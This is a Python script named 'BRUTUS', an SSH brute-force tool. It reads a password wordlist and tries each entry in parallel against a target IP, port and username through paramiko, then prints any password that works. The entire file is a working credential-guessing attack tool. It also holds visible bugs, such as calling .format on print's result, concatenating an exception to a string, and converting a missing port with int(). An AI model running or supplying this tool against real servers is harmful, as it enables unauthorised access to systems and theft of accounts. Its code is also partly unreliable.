import paramiko, colorama, sys, os, argparse, pyfiglet
from multiprocessing import Pool

#Class for subprocessing and SSH connections
class ProcessEngine(object):
    def __init__(self, ip, pass_filename, username, port=22):
        self.target = ip
        self.port = int(port)
        self.password_file = pass_filename
        self.username = username
    
    def connect(self, password=None):
        client = paramiko.SSHClient() #Initializing the SSH Client
        client.load_system_host_keys() #Loading the known host keys (default = known_hosts)
        client.set_missing_host_key_policy(policy=paramiko.AutoAddPolicy)
        try:
            client.connect(hostname=self.target, port=self.port, username=self.username, password=password)
            ret = 0
        except paramiko.AuthenticationException:
            ret = 2
        except paramiko.SSHException:
            ret = 1
        client.close()
        return ret
    
    def __call__(self, password): #password is a iterable used via map func
        try:
            ret = self.connect(password=password)
            if ret == 0:
                print(colorama.Fore.LIGHTGREEN_EX + "\n\nAuthentication Successful -- Password Found\n\n")
                print(colorama.Fore.LIGHTGREEN_EX + "---------------------------------------------------\n")
                print(colorama.Fore.LIGHTGREEN_EX + "Username: {} Password: {}\n").format(self.username, password)
                print(colorama.Fore.LIGHTGREEN_EX + "---------------------------------------------------\n")
                sys.exit(0)
            if ret == 1:
                print(colorama.Fore.YELLOW + "---------------------------------------------------\n")
                print(colorama.Fore.YELLOW + "SSH Service not found on target\n")
                print(colorama.Fore.YELLOW + "---------------------------------------------------\n")
                print(colorama.Style.RESET_ALL)
            if ret == 2:
                print("Authentication Failed for password: {}".format(password))
        except Exception as e:
            print(colorama.Fore.RED + e)
            pass

def main():
    fig = pyfiglet.Figlet(font='doom', width=100)
    print(fig.renderText('<*> BRUTUS <*>\n\
                         --------------'))
    #Argument parser
    colorama.just_fix_windows_console()
    print(colorama.Fore.RED)
    prsr = argparse.ArgumentParser(description="SSH Bruteforcer by Barış Akyıldız",
                                   formatter_class= argparse.RawTextHelpFormatter)
    prsr.add_argument("-t", "--target", help="Target's IP address or URL", required=True)
    prsr.add_argument("-p", "--port", help="Target SSH port (Default --> 22)")
    prsr.add_argument("-f", "--filename", help="Name of the file to use", required=True)
    prsr.add_argument("-u", "--username", help="Username to use to authenticate", required=True)
    args = prsr.parse_args()
    print(colorama.Style.RESET_ALL)

    try:
        engine = ProcessEngine(str(args.target), str(args.filename), str(args.username), int(args.port))
        with open(engine.password_file ,mode='r') as fp:
            totalList = fp.readlines()
        fp.close()
        for i in range(len(totalList)):
            totalList[i] = totalList[i].strip("\n")
        pool = Pool(os.cpu_count())
        output = pool.map(engine, totalList)
    finally:
        pool.close()
        pool.join()

if __name__ == '__main__':
    main()